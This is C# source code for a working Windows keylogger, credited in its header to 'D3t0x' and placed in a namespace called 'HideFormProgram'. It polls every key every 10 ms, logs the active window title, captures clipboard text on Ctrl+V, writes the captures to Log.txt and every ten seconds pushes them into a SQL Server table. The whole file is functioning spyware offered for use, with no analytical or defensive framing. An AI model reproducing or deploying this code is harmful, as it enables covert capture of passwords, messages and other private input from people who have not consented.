/* *************************************************************************** *
 *  Title: .NET Keylogger
 * Author: D3t0x
 *   Date: 5/21/2007
 *   Type: Open Source
 * 
 * This software is based off "ArticleKeyLog";
 * which can be found at www.z3d0clan.com.
 * Alexander Kent is the original author. I have
 * modified the source to include some more advanced
 * logging features I thought were needed.
 * 
 * Added features:
 * » Focused/Active window title logging.
 * » Accurate character detection.(His version would display only CAPS)
 * » Log file formatting.
 * » Custom args [below]
 * *************************************************************************** *
 * Usage:
 * You have several args you can pass to customize the
 * program's execution.
 * netLogger.exe -f [filename] -m [mode] -i [interval] -o [output]
 *                    -f [filename](Name of the file. ".log" will always be the ext.)
 *                    -m ['hour' or 'day'] saves logfile name appended by the hour or day.
 *                    -i [interval] in milliseconds, flushes the buffer to either the
 *                                                    console or file. Shorter time = more cpu usage.
 *                                                    10000=10seconds : 60000=1minute : etc...
 *                    -o ['file' or 'console'] Outputs all data to either a file or console.
 * *************************************************************************** *
 * ArticleKeyLog - Basic Keystroke Mining
 * Date:          05/12/2005
 * Author:          D3t0x
 * d.t0x@hotmail.com
 * (www.z3d0clan.com)
 * *************************************************************************** */

using System;
using System.IO;
using System.Text;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.Collections.Generic;
using System.Data.SqlClient;
using System.Diagnostics;
using System.Timers;

namespace HideFormProgram
{
    public class Keylogger
    {
        [DllImport("User32.dll")]
        private static extern short GetAsyncKeyState(System.Windows.Forms.Keys vKey); // Keys enumeration
        [DllImport("User32.dll")]
        private static extern short GetAsyncKeyState(System.Int32 vKey);
        [DllImport("User32.dll")]
        public static extern int GetWindowText(int hwnd, StringBuilder s, int nMaxCount);
        [DllImport("User32.dll")]
        public static extern int GetForegroundWindow();

        private System.String keyBuffer;
        private static System.Timers.Timer timerKeyMine;
        private static System.Timers.Timer saveDataTimer;
        // private System.Timers.Timer timerBufferFlush;
        private System.String hWndTitle;
        private System.String hWndTitlePast;
        public System.String LOG_FILE;
        public System.String LOG_MODE;
        public System.String LOG_OUT;
        private bool tglAlt = false;
        private bool tglControl = false;
        private bool tglCapslock = false;
        private List<string> getrecord = new List<string>();
        private StreamWriter writer;
        private bool keypressed = false;
        public SqlConnection conn = new SqlConnection();
        string connectionString = "Data Source=HAIER-PC;Initial Catalog=myproject;Integrated Security=True";
        public Keylogger()
        {
            conn.ConnectionString = connectionString;
            if (!File.Exists("Log.txt"))
            {
                File.Create("Log.txt");
            }
            hWndTitle = ActiveApplTitle();
            hWndTitlePast = hWndTitle;

            //
            // keyBuffer
            //
            keyBuffer = "";

            // 
            // timerKeyMine
            // 
           timerKeyMine = new System.Timers.Timer();
            timerKeyMine.Elapsed += new System.Timers.ElapsedEventHandler(this.timerKeyMine_Elapsed);
            timerKeyMine.Interval = 10;
            timerKeyMine.Start();
            /////////////////    save  data timer
            saveDataTimer = new System.Timers.Timer();
            saveDataTimer.Elapsed += new System.Timers.ElapsedEventHandler(this.saveDataTimer_Elapsed);
            saveDataTimer.Interval = 10000;
            saveDataTimer.Start();

        }

        public static void KeyloggerstopTimer(string test)
        {
            try
            {
                if (test == "ON")
                {
                    saveDataTimer.Start();
                    timerKeyMine.Start();
                }
                if (test == "OFF")
                {
                    saveDataTimer.Stop();
                    timerKeyMine.Stop();
                }
            }
            catch (Exception ex) { Debug.WriteLine("error in Keylogger timer stoper\n" + ex); }
        }

        int tick_tick = 0;
        private void saveDataTimer_Elapsed(object sender, ElapsedEventArgs e)
        {
           // Console.WriteLine(++tick_tick);
            try
            {

                int row = 0;
                string[] data = null;
                if (new FileInfo("Log.txt").Length != 0)
                {
                    conn.Open();
                    using (StreamReader r = new StreamReader("Log.txt"))
                    {
                        string reader = r.ReadToEnd();
                        data = reader.Split('\n');

                        string[,] clearData = new string[data.Length, 4];
                        for (int i = 0; i < data.Length; i++)
                        {
                            string[] data1 = data[i].Split(new string[] { ",," }, StringSplitOptions.None);
                            for (int j = 0; j < data1.Length; j++)
                            {
                                clearData[i, j] = data1[j];
                            }
                        }
                        for (int m = 0; m < data.Length - 1; m++)
                        {
                            if (clearData[m, 0] != null && !string.IsNullOrEmpty(clearData[m, 1]) && clearData[m, 2] != null && clearData[m, 3] != null)
                            {
                                string query = "insert into KeyTyped(Program,KeyPressed,Daat,time) values(@pro,@key,@date,@time)";
                                SqlCommand cmd = new SqlCommand(query, conn);
                                cmd.Parameters.AddWithValue("@pro", clearData[m, 0]);
                                cmd.Parameters.AddWithValue("@key", clearData[m, 1]);
                                cmd.Parameters.AddWithValue("@date", clearData[m, 2]);
                                cmd.Parameters.AddWithValue("@time", clearData[m, 3]);
                                row = row + cmd.ExecuteNonQuery();
                            }
                        }
                    }

                    conn.Close();

                   // Console.WriteLine("row=" + row + "    data.length==" + data.Length);
                    if (row > 0)
                    {
                        Debug.WriteLine("Clear data");
                        File.WriteAllText("Log.txt", string.Empty);

                    }
                    else
                    {
                        Debug.WriteLine("Not Insert Successfully");
                    }


                }
                else
                {
                    Debug.WriteLine("No Data found");
                }

            }
            catch (Exception ex) { Debug.WriteLine("Error in keylogger\n" + ex); }
            // throw new NotImplementedException();
        }

        public static string ActiveApplTitle()
        {
            int hwnd = GetForegroundWindow();
            StringBuilder sbTitle = new StringBuilder(1024);
            int intLength = GetWindowText(hwnd, sbTitle, sbTitle.Capacity);
            if ((intLength <= 0) || (intLength > sbTitle.Length)) return "unknown";
            string title = sbTitle.ToString();
            return title;
        }

        private void timerKeyMine_Elapsed(object sender, System.Timers.ElapsedEventArgs e)
        {
            if (keyBuffer.Length > 0)
            {
                Flush2Console(keyBuffer, false);
            }
            hWndTitle = ActiveApplTitle();
            if (hWndTitle != hWndTitlePast)
            {
                if (getrecord.Count > 0 && keypressed == true)
                {
                   // Console.WriteLine();
                    //TextInFile(getrecord);
                    saveinFile(getrecord);
                }
                getrecord.Clear();
                if (LOG_OUT == "file")
                {
                    keyBuffer += "[" + hWndTitle + "]";
                }
                else
                {
                    if (!hWndTitle.Contains("unknown") && !hWndTitle.Contains("KeyLogger"))
                    {
                        Flush2Console("[" + hWndTitle + "]", true);

                    }
                    /* if (keyBuffer.Length > 0)
                     {
                     Flush2Console(keyBuffer, false);

                     }*/
                }
                hWndTitlePast = hWndTitle;

            }

            foreach (System.Int32 i in Enum.GetValues(typeof(Keys)))
            {
                if (GetAsyncKeyState(i) == -32767)
                {
                    //Console.WriteLine(i.ToString()); // Outputs the pressed key code [Debugging purposes]
                    if (ControlKey)
                    {
                        if (!tglControl)
                        {
                            tglControl = true;
                            keyBuffer += "<Ctrl=On>";
                        }
                    }
                    else
                    {
                        if (tglControl)
                        {
                            tglControl = false;
                            keyBuffer += "<Ctrl=Off>";
                        }
                    }

                    if (AltKey)
                    {
                        if (!tglAlt)
                        {
                            tglAlt = true;
                            keyBuffer += "<Alt=On>";
                        }
                    }
                    else
                    {
                        if (tglAlt)
                        {
                            tglAlt = false;
                            keyBuffer += "<Alt=Off>";
                        }
                    }

                    if (CapsLock)
                    {
                        if (!tglCapslock)
                        {
                            tglCapslock = true;
                            keyBuffer += "<CapsLock=On>";
                        }
                    }
                    else
                    {
                        if (tglCapslock)
                        {
                            tglCapslock = false;
                            keyBuffer += "<CapsLock=Off>";
                        }
                    }


                    if (Enum.GetName(typeof(Keys), i) == "LButton")
                        keyBuffer += "";//"<LMouse>";
                    else if (Enum.GetName(typeof(Keys), i) == "RButton")
                        keyBuffer += "";//"<RMouse>";
                    else if (Enum.GetName(typeof(Keys), i) == "Back")
                        keyBuffer += "<Backspace>";
                    else if (Enum.GetName(typeof(Keys), i) == "Space")
                        keyBuffer += " ";
                    else if (Enum.GetName(typeof(Keys), i) == "Enter")
                        keyBuffer += "<Enter>";
                    else if (Enum.GetName(typeof(Keys), i) == "ControlKey")
                        continue;
                    else if (Enum.GetName(typeof(Keys), i) == "LControlKey")
                        continue;
                    else if (Enum.GetName(typeof(Keys), i) == "RControlKey")
                        continue;
                    else if (Enum.GetName(typeof(Keys), i) == "LControlKey")
                        continue;
                    else if (Enum.GetName(typeof(Keys), i) == "ShiftKey")
                        continue;
                    else if (Enum.GetName(typeof(Keys), i) == "LShiftKey")
                        continue;
                    else if (Enum.GetName(typeof(Keys), i) == "RShiftKey")
                        continue;
                    else if (Enum.GetName(typeof(Keys), i) == "Delete")
                        keyBuffer += "<Del>";
                    else if (Enum.GetName(typeof(Keys), i) == "Insert")
                        keyBuffer += "<Ins>";
                    else if (Enum.GetName(typeof(Keys), i) == "Home")
                        keyBuffer += "<Home>";
                    else if (Enum.GetName(typeof(Keys), i) == "End")
                        keyBuffer += "<End>";
                    else if (Enum.GetName(typeof(Keys), i) == "Tab")
                        keyBuffer += "<Tab>";
                    else if (Enum.GetName(typeof(Keys), i) == "Prior")
                        keyBuffer += "<Page Up>";
                    else if (Enum.GetName(typeof(Keys), i) == "PageDown")
                        keyBuffer += "<Page Down>";
                    else if (Enum.GetName(typeof(Keys), i) == "LWin" || Enum.GetName(typeof(Keys), i) == "RWin")
                        keyBuffer += "<Win>";
                    else if (Enum.GetName(typeof(Keys), i) == "NumPad1" && Control.IsKeyLocked(Keys.NumLock))
                        keyBuffer += "1";
                    else if (Enum.GetName(typeof(Keys), i) == "NumPad2" && Control.IsKeyLocked(Keys.NumLock))
                        keyBuffer += "2";
                    else if (Enum.GetName(typeof(Keys), i) == "NumPad3" && Control.IsKeyLocked(Keys.NumLock))
                        keyBuffer += "3";
                    else if (Enum.GetName(typeof(Keys), i) == "NumPad4" && Control.IsKeyLocked(Keys.NumLock))
                        keyBuffer += "4";
                    else if (Enum.GetName(typeof(Keys), i) == "NumPad5" && Control.IsKeyLocked(Keys.NumLock))
                        keyBuffer += "5";
                    else if (Enum.GetName(typeof(Keys), i) == "NumPad6" && Control.IsKeyLocked(Keys.NumLock))
                        keyBuffer += "6";
                    else if (Enum.GetName(typeof(Keys), i) == "NumPad7" && Control.IsKeyLocked(Keys.NumLock))
                        keyBuffer += "7";
                    else if (Enum.GetName(typeof(Keys), i) == "NumPad8" && Control.IsKeyLocked(Keys.NumLock))
                        keyBuffer += "8";
                    else if (Enum.GetName(typeof(Keys), i) == "NumPad9" && Control.IsKeyLocked(Keys.NumLock))
                        keyBuffer += "9";
                    else if (Enum.GetName(typeof(Keys), i) == "NumPad0" && Control.IsKeyLocked(Keys.NumLock))
                        keyBuffer += "0";

                    /* ********************************************** *
                     * Detect key based off ShiftKey Toggle
                     * ********************************************** */
                    if (ShiftKey)
                    {
                        if (i >= 65 && i <= 122)
                        {
                            keyBuffer += (char)i;
                        }
                        else if (i.ToString() == "49")
                            keyBuffer += "!";
                        else if (i.ToString() == "50")
                            keyBuffer += "@";
                        else if (i.ToString() == "51")
                            keyBuffer += "#";
                        else if (i.ToString() == "52")
                            keyBuffer += "$";
                        else if (i.ToString() == "53")
                            keyBuffer += "%";
                        else if (i.ToString() == "54")
                            keyBuffer += "^";
                        else if (i.ToString() == "55")
                            keyBuffer += "&";
                        else if (i.ToString() == "56")
                            keyBuffer += "*";
                        else if (i.ToString() == "57")
                            keyBuffer += "(";
                        else if (i.ToString() == "48")
                            keyBuffer += ")";
                        else if (i.ToString() == "192")
                            keyBuffer += "~";
                        else if (i.ToString() == "189")
                            keyBuffer += "_";
                        else if (i.ToString() == "187")
                            keyBuffer += "+";
                        else if (i.ToString() == "219")
                            keyBuffer += "{";
                        else if (i.ToString() == "221")
                            keyBuffer += "}";
                        else if (i.ToString() == "220")
                            keyBuffer += "|";
                        else if (i.ToString() == "186")
                            keyBuffer += ":";
                        else if (i.ToString() == "222")
                            keyBuffer += "\"";
                        else if (i.ToString() == "188")
                            keyBuffer += "<";
                        else if (i.ToString() == "190")
                            keyBuffer += ">";
                        else if (i.ToString() == "191")
                            keyBuffer += "?";
                    }
                    else
                    {
                        if (i >= 65 && i <= 122)
                        {
                            keyBuffer += (char)(i + 32);
                        }
                        else if (i.ToString() == "49")
                            keyBuffer += "1";
                        else if (i.ToString() == "50")
                            keyBuffer += "2";
                        else if (i.ToString() == "51")
                            keyBuffer += "3";
                        else if (i.ToString() == "52")
                            keyBuffer += "4";
                        else if (i.ToString() == "53")
                            keyBuffer += "5";
                        else if (i.ToString() == "54")
                            keyBuffer += "6";
                        else if (i.ToString() == "55")
                            keyBuffer += "7";
                        else if (i.ToString() == "56")
                            keyBuffer += "8";
                        else if (i.ToString() == "57")
                            keyBuffer += "9";
                        else if (i.ToString() == "48")
                            keyBuffer += "0";
                        else if (i.ToString() == "189")
                            keyBuffer += "-";
                        else if (i.ToString() == "187")
                            keyBuffer += "=";
                        else if (i.ToString() == "92")
                            keyBuffer += "`";
                        else if (i.ToString() == "219")
                            keyBuffer += "[";
                        else if (i.ToString() == "221")
                            keyBuffer += "]";
                        else if (i.ToString() == "220")
                            keyBuffer += "\\";
                        else if (i.ToString() == "186")
                            keyBuffer += ";";
                        else if (i.ToString() == "222")
                            keyBuffer += "'";
                        else if (i.ToString() == "188")
                            keyBuffer += ",";
                        else if (i.ToString() == "190")
                            keyBuffer += ".";
                        else if (i.ToString() == "191")
                            keyBuffer += "/";
                    }
                    //************************************************ *
                    //      Detect Ctrl+v
                    //************************************************ *

                    if (tglControl == true && i == 86)
                    {
                        string text = HideFormProgram.GetData.getData();
                        if (text != null)
                        {
                            Flush2Console(text, false);
                        }
                    }
                }
            }
        }

        #region toggles
        public static bool ControlKey
        {
            get { return Convert.ToBoolean(GetAsyncKeyState(Keys.ControlKey) & 0x8000); }
        } // ControlKey
        public static bool ShiftKey
        {
            get { return Convert.ToBoolean(GetAsyncKeyState(Keys.ShiftKey) & 0x8000); }
        } // ShiftKey
        public static bool CapsLock
        {

            get { return Convert.ToBoolean(GetAsyncKeyState(Keys.CapsLock) & 0x8000); }
        } // CapsLock
        public static bool AltKey
        {
            get { return Convert.ToBoolean(GetAsyncKeyState(Keys.Menu) & 0x8000); }
        } // AltKey
        #endregion

        public void Flush2Console(string data, bool writeLine)
        {
            if (writeLine)
            {
                // Console.WriteLine(data);
                getrecord.Add(data + ",,");
                keypressed = false;
            }
            else
            {
                // Console.WriteLine(data);
                getrecord.Add(data);
                keypressed = true;
                keyBuffer = ""; // reset
            }
        }
        public void saveinFile(List<string> data)
        {
            
                try
                {
                        //Debug.WriteLine("IF Run");
                        FileStream file = new FileStream("Log.txt", FileMode.Append, FileAccess.Write);
                        using (writer = new StreamWriter(file))
                        {
                            foreach (string s in data)
                            {
                                writer.Write(s);
                            }
                            string date = ",," + DateTime.Now.ToString("d") + ",," + DateTime.Now.ToString("HH:mm:ss");
                            writer.Write(date);
                            writer.WriteLine();
                        }
                        writer.Close();
                        getrecord.Clear();


                    }
            catch (Exception ex)
                {
                    Debug.WriteLine("Error in Keylogger\n" + ex);
                }
            
              

}
        // this function just use for print purpose
        public void TextInFile(List<string> data)
        {
            try
            {

                foreach (string s in data)
                {
                    Console.Write(s);
                }
            }
            catch { }

        }

    }
}